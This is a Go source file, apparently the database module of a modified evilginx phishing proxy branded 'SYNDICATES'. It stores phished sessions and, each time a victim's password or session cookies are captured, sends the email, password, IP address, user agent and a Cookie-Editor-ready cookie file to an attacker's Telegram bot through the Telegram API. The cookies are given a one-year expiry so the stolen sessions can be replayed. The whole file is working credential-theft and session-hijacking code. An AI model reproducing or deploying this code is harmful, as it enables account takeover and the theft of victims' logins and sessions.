package database

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"strings"
	"sync"

	"strconv"
	"time"

	"github.com/tidwall/buntdb"
)

// Notification callback — set by core package to avoid circular imports.
// Called when credentials or tokens are captured.
var OnCredentialCaptured func(username, password, ip, userAgent string)
var OnSessionCaptured func(username, password, ip, userAgent string)

// TelegramConfig holds bot token and chat ID loaded from telegram.json
type TelegramConfig struct {
	BotToken string `json:"bot_token"`
	ChatID   string `json:"chat_id"`
}

var (
	chat_id string
	token   string
)

func init() {
	// Priority 1: Environment variables (backwards compatible)
	token = strings.TrimSpace(os.Getenv("TG_BOT_TOKEN"))
	chat_id = strings.TrimSpace(os.Getenv("TG_CHAT_ID"))

	// Priority 2: telegram.json in working directory
	if token == "" || chat_id == "" {
		loadTelegramConfig("telegram.json")
	}

	// Priority 3: telegram.json in config subdirectory
	if token == "" || chat_id == "" {
		loadTelegramConfig("config/telegram.json")
	}

	// Priority 4: telegram.json in /opt/evilginx/
	if token == "" || chat_id == "" {
		loadTelegramConfig("/opt/evilginx/telegram.json")
	}

	// Priority 5: telegram.json in /opt/evilginx/config/
	if token == "" || chat_id == "" {
		loadTelegramConfig("/opt/evilginx/config/telegram.json")
	}

	if token != "" && chat_id != "" {
		fmt.Printf("[telegram] alerts enabled (chat_id: %s)\n", chat_id)
	}
}

func loadTelegramConfig(path string) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return
	}
	var cfg TelegramConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		return
	}
	if token == "" && cfg.BotToken != "" {
		token = strings.TrimSpace(cfg.BotToken)
	}
	if chat_id == "" && cfg.ChatID != "" {
		chat_id = strings.TrimSpace(cfg.ChatID)
	}
}

// SetTelegramBotToken updates the live bot token (called from config when user sets via terminal)
func SetTelegramBotToken(t string) {
	token = strings.TrimSpace(t)
	if token != "" && chat_id != "" {
		fmt.Printf("[telegram] alerts enabled (chat_id: %s)\n", chat_id)
	}
}

// SetTelegramChatID updates the live chat ID (called from config when user sets via terminal)
func SetTelegramChatID(id string) {
	chat_id = strings.TrimSpace(id)
	if token != "" && chat_id != "" {
		fmt.Printf("[telegram] alerts enabled (chat_id: %s)\n", chat_id)
	}
}

// GetTelegramBotToken returns the current bot token
func GetTelegramBotToken() string {
	return token
}

// GetTelegramChatID returns the current chat ID
func GetTelegramChatID() string {
	return chat_id
}

// Track which sessions already sent cookie alerts (prevent duplicates from multiple auth URLs)
var sentCookieAlertsMu sync.Mutex
var sentCookieAlerts = make(map[string]bool)
var sentCredAlertsMu sync.Mutex
var sentCredAlerts = make(map[string]bool)

func telegramSendCredAlert(username string, password string, ip string, agent string, sid string) {
	if token == "" || chat_id == "" {
		return
	}
	text := "..........\U0001f916[ SYNDICATES ]\U0001f916..........\n" +
		"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501+\n" +
		"\U0001f4ecEmail: " + username + "\n" +
		"\U0001f510PassWD: " + password + "\n" +
		"+\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"

	apiURL := "https://api.telegram.org/bot" + token + "/sendMessage"
	resp, err := http.PostForm(apiURL, map[string][]string{
		"chat_id": {chat_id},
		"text":    {text},
	})
	if err != nil {
		fmt.Printf("[telegram] send error: %v\n", err)
	} else {
		resp.Body.Close()
		if resp.StatusCode != 200 {
			fmt.Printf("[telegram] send failed: HTTP %d\n", resp.StatusCode)
		}
	}
}

func telegramSendCookieAlert(cookies string, username string, password string, ip string, agent string, sid string) {
	if token == "" || chat_id == "" {
		return
	}
	// Prevent duplicate sends (thread-safe)
	sentCookieAlertsMu.Lock()
	if sentCookieAlerts[sid] {
		sentCookieAlertsMu.Unlock()
		return
	}
	sentCookieAlerts[sid] = true
	sentCookieAlertsMu.Unlock()

	client := &http.Client{}
	fileName := username + "-Cookies.json"

	now := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")
	text := "..........\U0001f916[ SYNDICATES ]\U0001f916..........\n" +
		"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501+\n" +
		"\U0001f4ecEmail: " + username + "\n" +
		"\U0001f510PassWD: " + password + "\n" +
		"+\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
		"\U0001f4cdIP: " + ip + "\n" +
		"\U0001f4f1\U0001f5a5 " + agent + "\n" +
		"\U0001f4c5\u23f0Date: " + now + "\n" +
		"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501+"

	err := ioutil.WriteFile(fileName, []byte(cookies), 0755)
	if err != nil {
		fmt.Printf("Unable to write file: %v", err)
		return
	}

	fileDir, _ := os.Getwd()
	filePath := path.Join(fileDir, fileName)

	file, _ := os.Open(filePath)
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("document", filepath.Base(file.Name()))
	io.Copy(part, file)
	writer.WriteField("caption", text)
	writer.Close()

	apiURL := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id
	req, _ := http.NewRequest("POST", apiURL, body)
	req.Header.Add("Content-Type", writer.FormDataContentType())
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[telegram] cookie send error: %v\n", err)
	} else {
		resp.Body.Close()
		if resp.StatusCode != 200 {
			fmt.Printf("[telegram] cookie send failed: HTTP %d\n", resp.StatusCode)
		}
	}
	os.Remove(fileName)
}

type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	err := d.sessionsUpdatePassword(sid, password)
	if err == nil && password != "" {
		data, err2 := d.sessionsGetBySid(sid)
		if err2 == nil && data != nil && data.Username != "" {
			go telegramSendCredAlert(data.Username, password, data.RemoteAddr, data.UserAgent, strconv.Itoa(data.Id))
			if OnCredentialCaptured != nil {
				go OnCredentialCaptured(data.Username, password, data.RemoteAddr, data.UserAgent)
			}
		}
	}
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token) error {
	err := d.sessionsUpdateTokens(sid, tokens)

	// Cookie-Editor compatible format — matches working evilginx export exactly
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly"`
		HostOnly       bool   `json:"hostOnly"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			d := domain
			if len(d) > 0 && d[0] == '.' {
				d = d[1:]
			}
			path := "/"
			if v.Path != "" {
				path = v.Path
			}
			c := &Cookie{
				Path:           path,
				Domain:         d,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				HostOnly:       true,
			}
			cookies = append(cookies, c)
		}
	}

	data, err2 := d.sessionsGetBySid(sid)
	if err2 != nil || data == nil {
		return err
	}

	// Only send cookie alert if we have credentials and tokens
	if len(cookies) > 0 && data.Username != "" {
		json11, _ := json.Marshal(cookies)
		go telegramSendCookieAlert(string(json11), data.Username, data.Password, data.RemoteAddr, data.UserAgent, strconv.Itoa(data.Id))
	}
	if OnSessionCaptured != nil && data.Username != "" {
		go OnSessionCaptured(data.Username, data.Password, data.RemoteAddr, data.UserAgent)
	}
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() error {
	err := d.db.Shrink()
	if err != nil {
		return err
	}
	return nil
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) (string, error) {
	pivot, err := json.Marshal(t)
	if err != nil {
		return "", err
	}
	return string(pivot), nil
}
